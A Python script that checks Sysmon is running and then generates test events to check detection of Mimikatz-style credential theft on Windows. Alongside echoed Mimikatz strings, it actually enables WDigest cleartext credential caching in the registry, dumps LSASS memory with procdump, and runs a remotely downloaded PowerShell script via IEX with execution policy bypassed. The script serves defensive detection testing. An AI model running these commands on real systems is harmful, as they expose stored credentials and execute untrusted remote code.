import os
import subprocess
import wmi
import time

# Function to check if Sysmon is running
def check_sysmon_service():
    print("[*] Checking if Sysmon is running...")
    c = wmi.WMI()
    for service in c.Win32_Service(Name="Sysmon"):
        if service.State == "Running":
            print("[✔] Sysmon is running.")
            return True
    print("[✖] Sysmon is NOT running! Start it using: sc start Sysmon")
    return False

# Function to check if Sysmon configuration file exists
def check_sysmon_config():
    sysmon_config_path = "C:\\temp\\config-sysmon64.xml"
    print("[*] Checking Sysmon configuration...")
    if os.path.exists(sysmon_config_path):
        print(f"[✔] Sysmon configuration found at {sysmon_config_path}.")
        return True
    print("[✖] Sysmon configuration file is missing!")
    return False

# Function to trigger test security events
def trigger_test_events():
    print("[*] Generating test events for Sysmon and Security logs...")

    # Simulate process execution for Mimikatz detection
    print("[*] Testing process execution detection...")
    test_commands = [
        "cmd.exe /c echo sekurlsa::logonpasswords",
        "cmd.exe /c echo lsadump::dcsync",
        "cmd.exe /c echo privilege::debug",
        "cmd.exe /c echo sekurlsa::pth",
        "cmd.exe /c echo token::elevate",
        "cmd.exe /c echo kerberos::ptt",
        "cmd.exe /c echo mimikatz.exe",
        "cmd.exe /c echo mimika",
        "cmd.exe /c echo mim.exe",
        "cmd.exe /c echo mkat",
        "cmd.exe /c echo lsass.exe",
    ]
    for cmd in test_commands:
        subprocess.run(["cmd.exe", "/c", cmd], shell=True)
        
    # Simulate Registry modification (UseLogonCredential)
    print("[*] Testing registry modification detection...")
    reg_cmd = r'reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f'
    subprocess.run(["cmd.exe", "/c", reg_cmd], shell=True)

        # Simulate LSASS memory access
    print("[*] Testing LSASS access detection...")
    subprocess.run(["cmd.exe", "/c", 'tasklist /FI "IMAGENAME^=lsass.exe"'], shell=True)
    subprocess.run(["cmd.exe", "/c", "procdump -accepteula -ma lsass.exe lsass.dmp"], shell=True)

    # Simulate NTDS.dit access
    print("[*] Testing NTDS.dit file access detection...")
    subprocess.run(["cmd.exe", "/c", "echo Accessing ntds.dit"], shell=True)

    # Simulate PowerShell-based attack detection
    print("[*] Testing PowerShell-based attack detection...")

#    # Simulate benign commands that resemble Invoke-Mimikatz and Invoke-DCSync
#    mimikatz_sim = "Write-Host 'Invoke-Mimikatz simulation'"
#    dcsync_sim = "Write-Host 'Invoke-DCSync simulation'"

#    subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-Command", mimikatz_sim], shell=True)
#    subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-Command", dcsync_sim], shell=True)

    # Simulate PowerShell downloading commands
    download_url = "https://raw.githubusercontent.com/akaBetsy/DetectMimikatz/main/fakemalware.ps1"
    download_sim = f"IEX (New-Object Net.WebClient).DownloadString('{download_url}')"
    subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-Command", download_sim], shell=True)

    print("[✔] Test security events triggered. Waiting 5 seconds before log check...")
    time.sleep(5)

# Main function to orchestrate checks
def main():
    print("\n===== Sysmon & Security Test Script =====")

    if not check_sysmon_service():
        return
    if not check_sysmon_config():
        return

    trigger_test_events()

    print("[✔] Testing complete. Run the log export script to verify detections.")

if __name__ == "__main__":
    main()
